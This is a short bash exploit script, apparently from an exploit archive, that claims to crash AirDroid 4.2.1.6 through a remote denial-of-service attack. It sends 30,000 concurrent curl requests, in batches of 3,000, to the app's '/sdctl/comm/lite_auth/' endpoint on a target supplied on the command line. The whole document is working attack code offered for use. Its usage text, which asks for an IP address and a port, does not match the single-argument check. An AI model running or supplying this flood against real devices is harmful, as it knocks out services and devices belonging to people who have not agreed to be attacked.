#!/bin/bash

# *****************************************************
# *       Author: Marcelo Vázquez (aka s4vitar)       *
# *  AirDroid Denial of Service (DoS) [System Crash]  *
# *****************************************************

# Exploit Title: AirDroid Remote Denial of Service (DoS) & System Crash
# Date: 2019-02-07
# Exploit Author: Marcelo Vázquez
# Vendor Homepage: https://web.airdroid.com/
# Software Link: https://play.google.com/store/apps/details?id=com.sand.airdroid&hl=en
# Version: AirDroid 4.2.1.6

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c() {
        echo -e "\n\n[*]Exiting...\n" && tput cnorm
        pkill curl > /dev/null 2>&1
        exit
}

if [ "$(echo $#)" == "1" ]; then
	echo -e "\nAtaque contra el dominio $1\n"
	for i in $(seq 1 10); do
		for i in $(seq 1 3000); do
			curl --silent "$1/sdctl/comm/lite_auth/" &
		done && wait
	done
else
	echo -e "\n${blueColour}Usage: ${endColour}${redColour}./airdroid_dos.sh ${endColour}${yellowColour}<${endColour}${grayColour}ip_address${endColour}${yellowColour}>${endColour}${yellowColour} <${endColour}${grayColour}port${endColour}${yellowColour}>${endColour}\n"
fi
